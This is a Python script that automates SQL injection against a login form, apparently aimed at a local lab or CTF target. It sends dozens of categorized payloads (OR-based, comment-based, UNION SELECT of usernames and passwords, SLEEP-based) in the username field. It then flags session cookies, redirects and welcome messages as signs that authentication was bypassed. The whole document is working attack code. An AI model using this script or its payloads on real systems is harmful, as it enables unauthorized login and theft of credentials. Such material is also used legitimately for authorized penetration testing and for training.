import requests
import time
from urllib.parse import urljoin

# Target information
TARGET_URL = "http://127.0.0.1:33167/login.php"

# Initialize session
session = requests.Session()

def send_login_request(username_payload, password="password"):
    """Send login request with given payload and return response details."""
    data = {
        'username': username_payload,
        'password': password
    }
    
    try:
        response = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=10)
        return {
            'payload': username_payload,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'has_session_cookie': 'PHPSESSID' in response.cookies,
            'cookies': dict(response.cookies),
            'is_redirect': 300 <= response.status_code < 400,
            'redirect_location': response.headers.get('Location', ''),
            'response_text': response.text,
            'response_time': response.elapsed.total_seconds()
        }
    except Exception as e:
        return {
            'payload': username_payload,
            'error': str(e)
        }

# 1. Establish baseline with failed login
print("="*80)
print("[1] ESTABLISHING BASELINE WITH FAILED LOGIN")
print("="*80)
baseline_payload = "invalid_user"
baseline_response = send_login_request(baseline_payload, "wrong_password")
print(f"Baseline payload: {baseline_payload}")
print(f"Status code: {baseline_response['status_code']}")
print(f"Response length: {baseline_response['response_length']} bytes")
print(f"Has session cookie: {baseline_response['has_session_cookie']}")
print(f"Response time: {baseline_response['response_time']:.3f}s")
print()

# 2. Test SQL injection payloads for authentication bypass
print("="*80)
print("[2] TESTING SQL INJECTION AUTHENTICATION BYPASS PAYLOADS")
print("="*80)

# Define comprehensive payload categories
payloads = {
    "Classic OR-based": [
        "admin' OR '1'='1'",
        "admin' OR '1'='1'--",
        "admin' OR '1'='1'#",
        "admin' OR '1'='1'/*",
        "admin' OR 1=1--",
        "admin' OR 1=1#",
        "admin' OR 1=1/*",
    ],
    "Comment-based": [
        "admin'--",
        "admin'#",
        "admin'/*",
        "admin'-- -",
        "admin'--+",
        "admin'-- ",
    ],
    "Boolean conditions": [
        "admin' AND '1'='1'--",
        "admin' AND '1'='2'--",
        "admin' OR '1'='2'--",
        "admin' AND 1=1--",
        "admin' AND 1=2--",
    ],
    "Nested quotes": [
        "admin' OR ''='",
        "admin' OR 'x'='x'--",
        "admin' OR 'x'='x'#",
    ],
    "Username variations": [
        "' OR '1'='1'--",
        "' OR ''='",
        "' OR '1'",
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
    ],
    "Payload with admin variations": [
        "admin' OR 'a'='a'--",
        "admin' OR 'b'='b'--",
        "admin' OR username='admin'--",
    ],
    "Parentheses bypass": [
        "admin') OR '1'='1'",
        "admin') OR '1'='1'--",
        "') OR '1'='1'--",
    ],
    "Double dash variations": [
        "admin' OR 1=1-- ",
        "admin' OR 1=1--\t",
        "admin' OR 1=1--\n",
    ],
    "Alternative comments": [
        "admin' OR '1'='1';",
        "admin' OR '1'='1';--",
        "admin' OR '1'='1';#",
    ],
    "UNION-based (if auth bypass fails)": [
        "admin' UNION SELECT 1,2,3--",
        "admin' UNION SELECT 'admin','password'--",
        "' UNION SELECT NULL,username,password FROM users--",
        "' UNION SELECT username,password FROM users--",
    ],
    "Error-based patterns": [
        "admin' AND (SELECT 1 FROM (SELECT SLEEP(5))A)--",
        "admin' OR (SELECT 1 FROM (SELECT SLEEP(5))A)--",
    ]
}

# Test each payload category
results = []
anomalies = []
successful_attempts = []

total_payloads = sum(len(payload_list) for payload_list in payloads.values())
current = 0

print(f"Testing {total_payloads} payloads across {len(payloads)} categories...\n")

for category, payload_list in payloads.items():
    print(f"\\n[+] {category}")
    print("-" * 80)
    
    for payload in payload_list:
        current += 1
        print(f"[{current}/{total_payloads}] Testing: {payload}")
        
        # Send request
        result = send_login_request(payload)
        
        if 'error' in result:
            print(f"  [-] ERROR: {result['error']}")
            continue
        
        # Analyze response
        response_diff = result['response_length'] - baseline_response['response_length']
        is_different = abs(response_diff) > 50  # Significant difference threshold
        
        success_indicators = []
        if result['has_session_cookie']:
            success_indicators.append("SESSION_COOKIE")
        if result['is_redirect']:
            success_indicators.append(f"REDIRECT({result['redirect_location']})")
        if result['status_code'] != baseline_response['status_code']:
            success_indicators.append(f"STATUS_{result['status_code']}")
        if is_different:
            success_indicators.append(f"SIZE_DIFF({response_diff:+d})")
        
        # Check for welcome messages
        if "welcome" in result['response_text'].lower() or \
           "dashboard" in result['response_text'].lower() or \
           "logged in" in result['response_text'].lower() or \
           "logout" in result['response_text'].lower():
            success_indicators.append("WELCOME_MSG")
        
        result['success_indicators'] = success_indicators
        result['response_diff'] = response_diff
        
        # Display results
        print(f"  Status: {result['status_code']} | Length: {result['response_length']}B "
              f"| Diff: {response_diff:+d}B | Time: {result['response_time']:.3f}s")
        
        if success_indicators:
            print(f"  [!] INDICATORS: {', '.join(success_indicators)}")
            
            if result['has_session_cookie']:
                print(f"  [!] SESSION COOKIE DETECTED: {result['cookies']}")
            
            if result['is_redirect']:
                print(f"  [!] REDIRECT TO: {result['redirect_location']}")
                
            successful_attempts.append(result)
        
        # Flag anomalies
        if is_different or result['status_code'] != baseline_response['status_code']:
            anomalies.append(result)
        
        results.append(result)

# 3. Summary and analysis
print("\\n" + "="*80)
print("[3] RESULTS SUMMARY")
print("="*80)

print(f"Total payloads tested: {len(results)}")
print(f"Successful login attempts: {len(successful_attempts)}")
print(f"Anomalies detected: {len(anomalies)}")
print(f"Baseline response length: {baseline_response['response_length']} bytes")

